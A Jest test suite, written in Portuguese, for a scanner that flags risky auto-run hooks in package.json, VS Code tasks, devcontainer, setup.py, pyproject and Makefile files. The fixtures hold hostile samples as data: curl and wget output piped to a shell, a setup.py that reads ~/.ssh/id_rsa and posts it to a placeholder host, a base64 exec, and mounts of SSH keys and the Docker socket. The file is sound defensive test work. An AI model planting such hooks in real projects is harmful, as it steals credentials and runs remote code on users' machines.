import { analyzeManifests, inlineNodeCode, pythonLogicalLines } from '../src/analyzers/manifests';
import { findDownloadChains, sanitizeSnippet } from '../src/analyzers/common';
import { ArtifactKind, CollectedArtifact, Evidence } from '../src/types';

function artifact(path: string, kind: ArtifactKind, content: string): CollectedArtifact {
  return { path, kind, content };
}

function analyze(path: string, kind: ArtifactKind, content: string): Evidence[] {
  return analyzeManifests([artifact(path, kind, content)]).evidencias;
}

function rules(list: Evidence[]): string[] {
  return list.map((e) => e.id.split('@')[0]);
}

describe('package.json', () => {
  it('detecta scripts de ciclo de vida com a linha exata', () => {
    const content = [
      '{',
      '  "name": "desafio",',
      '  "scripts": {',
      '    "build": "tsc",',
      '    "postinstall": "node scripts/setup.js",',
      '    "prepare": "husky install"',
      '  }',
      '}',
    ].join('\n');
    const ev = analyze('package.json', 'package-json', content);
    expect(ev.map((e) => [e.id.split('@')[0], e.linha, e.coluna])).toEqual([
      ['npm-postinstall', 5, 5],
      ['npm-prepare', 6, 5],
    ]);
    expect(ev.every((e) => e.familia === 'EXEC_AUTOMATICA')).toBe(true);
    expect(ev[0].explicacao).toContain('node scripts/setup.js');
  });

  it('reporta chaves duplicadas (a de cima pode ser isca)', () => {
    const content = `{
  "scripts": {
    "postinstall": "echo ok",
    "postinstall": "node .x.js"
  }
}`;
    const ev = analyze('package.json', 'package-json', content);
    expect(ev.map((e) => e.linha)).toEqual([3, 4]);
  });

  it('fica em silêncio num package.json comum', () => {
    const content = JSON.stringify(
      { name: 'app', scripts: { build: 'tsc', test: 'jest', start: 'node dist/index.js' } },
      null,
      2,
    );
    expect(analyze('package.json', 'package-json', content)).toEqual([]);
  });

  it('detecta curl | sh em qualquer script e extrai node -e', () => {
    const content = `{
  "scripts": {
    "start": "curl -fsSL https://x.test/i.sh | bash",
    "preinstall": "node -e \\"require('child_process').exec('id')\\""
  }
}`;
    const result = analyzeManifests([artifact('package.json', 'package-json', content)]);
    expect(rules(result.evidencias)).toEqual(
      expect.arrayContaining(['download-encadeado', 'npm-preinstall']),
    );
    const chain = result.evidencias.find((e) => e.familia === 'DOWNLOAD_ENCADEADO');
    expect(chain?.linha).toBe(3);
    expect(result.scriptsEmbutidos).toHaveLength(1);
    expect(result.scriptsEmbutidos[0].codigo).toBe("require('child_process').exec('id')");
    expect(result.scriptsEmbutidos[0].linha).toBe(4);
  });
});

describe('tasks.json', () => {
  it('detecta runOn folderOpen em JSONC e marca como fora da contenção', () => {
    const content = `{
  // tarefa "de configuração"
  "version": "2.0.0",
  "tasks": [
    {
      "label": "preparar ambiente",
      "type": "shell",
      "command": "node",
      "args": [".vscode/boot.js"],
      "runOptions": {
        "runOn": "folderOpen"
      },
    },
  ],
}`;
    const ev = analyze('.vscode/tasks.json', 'vscode-tasks', content);
    expect(ev).toHaveLength(1);
    expect(ev[0]).toMatchObject({
      familia: 'EXEC_AUTOMATICA',
      linha: 11,
      foraDaContencao: true,
    });
    expect(ev[0].explicacao).toContain('preparar ambiente');
    expect(ev[0].explicacao).toContain('node .vscode/boot.js');
  });

  it('ignora tarefas sem execução automática', () => {
    const content = '{ "tasks": [ { "label": "build", "command": "npm run build" } ] }';
    expect(analyze('.vscode/tasks.json', 'vscode-tasks', content)).toEqual([]);
  });
});

describe('launch.json', () => {
  it('detecta preLaunchTask', () => {
    const content = `{
  "configurations": [
    { "name": "Debug", "type": "node", "request": "launch", "preLaunchTask": "setup" }
  ]
}`;
    const ev = analyze('.vscode/launch.json', 'vscode-launch', content);
    expect(rules(ev)).toEqual(['launch-preLaunchTask']);
    expect(ev[0].linha).toBe(3);
  });
});

describe('devcontainer.json', () => {
  it('distingue initializeCommand (hospedeiro) de postCreateCommand (container)', () => {
    const content = `{
  "image": "node:20",
  "initializeCommand": "bash .devcontainer/init.sh",
  "postCreateCommand": ["npm", "install"],
  "onCreateCommand": { "a": "echo a", "b": "echo b" }
}`;
    const ev = analyze('.devcontainer/devcontainer.json', 'devcontainer', content);
    const init = ev.find((e) => e.id.startsWith('devcontainer-initializeCommand'));
    const post = ev.find((e) => e.id.startsWith('devcontainer-postCreateCommand'));
    expect(init).toMatchObject({ linha: 3, foraDaContencao: true });
    expect(init?.explicacao).toContain('SUA máquina');
    expect(post?.foraDaContencao).toBeUndefined();
    expect(ev.some((e) => e.id.startsWith('devcontainer-onCreateCommand'))).toBe(true);
  });

  it('detecta montagem de segredos e do socket do Docker', () => {
    const content = `{
  "mounts": [
    "source=\${localEnv:HOME}/.ssh,target=/root/.ssh,type=bind",
    { "source": "/var/run/docker.sock", "target": "/var/run/docker.sock", "type": "bind" }
  ],
  "runArgs": ["-v", "\${localEnv:HOME}:/host"],
  "containerEnv": { "TOKEN": "\${localEnv:GITHUB_TOKEN}", "LANG": "C.UTF-8" }
}`;
    const ev = analyze('.devcontainer/devcontainer.json', 'devcontainer', content);
    expect(rules(ev).sort()).toEqual(
      ['devcontainer-env-segredo', 'devcontainer-escape', 'devcontainer-monta-segredos', 'devcontainer-monta-segredos'].sort(),
    );
  });
});

describe('setup.py', () => {
  it('fica em silêncio num setup.py típico', () => {
    const content = `"""Pacote de exemplo que menciona .env e wallet só na docstring."""
import os
from setuptools import setup, find_packages

here = os.path.abspath(os.path.dirname(__file__))
with open(os.path.join(here, "README.md")) as f:
    long_description = f.read()

setup(
    name="exemplo",
    version="1.0.0",
    packages=find_packages(),
    long_description=long_description,
)
`;
    expect(analyze('setup.py', 'setup-py', content)).toEqual([]);
  });

  it('detecta código no nível de módulo, cmdclass e padrões perigosos', () => {
    const content = `import os, base64, requests
from setuptools import setup
from setuptools.command.install import install

def coletar():
    dados = open(os.path.expanduser("~/.ssh/id_rsa")).read()
    requests.post("https://coleta.invalid", data=dados)

class Pos(install):
    def run(self):
        exec(base64.b64decode("cHJpbnQoMSk="))
        install.run(self)

coletar()
setup(name="x", cmdclass={"install": Pos})
`;
    const ev = analyze('setup.py', 'setup-py', content);
    const byRule = new Map(ev.map((e) => [e.id.split('@')[0], e]));
    expect(byRule.get('setup-py-nivel-modulo')?.linha).toBe(14);
    expect(byRule.get('setup-py-cmdclass')?.linha).toBe(15);
    expect(byRule.get('py-rede')?.linha).toBe(7);
    expect(byRule.get('py-codigo-dinamico')?.linha).toBe(11);
    expect(byRule.get('py-decodificacao')?.linha).toBe(11);
    expect(byRule.get('py-caminho-sensivel')?.linha).toBe(6);
  });

  it('une linhas lógicas e ignora comentários', () => {
    const lines = pythonLogicalLines('x = f(1,\n  2)  # os.system("x")\ny = 3\n');
    expect(lines.map((l) => l.code)).toEqual(['x = f(1,   2)', 'y = 3']);
  });
});

describe('pyproject.toml e Makefile', () => {
  it('detecta backend de build local', () => {
    const content = '[build-system]\nrequires = []\nbuild-backend = "meu_backend"\nbackend-path = ["."]\n';
    const ev = analyze('pyproject.toml', 'pyproject', content);
    expect(ev.map((e) => [e.id.split('@')[0], e.linha])).toEqual([['pyproject-backend-local', 4]]);
  });

  it('detecta download encadeado em receita do Makefile', () => {
    const content = 'setup:\n\t@wget -qO- https://x.test/s | sh\n';
    const ev = analyze('Makefile', 'makefile', content);
    expect(ev.map((e) => [e.familia, e.linha, e.coluna])).toEqual([['DOWNLOAD_ENCADEADO', 2, 3]]);
  });
});

describe('utilitários', () => {
  it('reconhece variantes de baixar-e-executar', () => {
    expect(findDownloadChains('curl -s https://a | sudo bash')).toHaveLength(1);
    expect(findDownloadChains('bash <(curl -s https://a)')).toHaveLength(1);
    expect(findDownloadChains('sh -c "$(wget -qO- https://a)"')).toHaveLength(1);
    expect(findDownloadChains('iwr https://a/x.ps1 | iex')).toHaveLength(1);
    expect(findDownloadChains('curl -o out.tgz https://a')).toHaveLength(0);
  });

  it('extrai código de node -e', () => {
    expect(inlineNodeCode('node --no-warnings -e "console.log(1)" && node x.js')).toEqual(['console.log(1)']);
    expect(inlineNodeCode('node x.js')).toEqual([]);
  });

  it('neutraliza caracteres bidirecionais e corta em 120', () => {
    expect(sanitizeSnippet('a\u202eb')).toBe('a⟨U+202E⟩b');
    const long = sanitizeSnippet('x'.repeat(500));
    expect(long).toHaveLength(120);
    expect(long.endsWith('…')).toBe(true);
  });
});
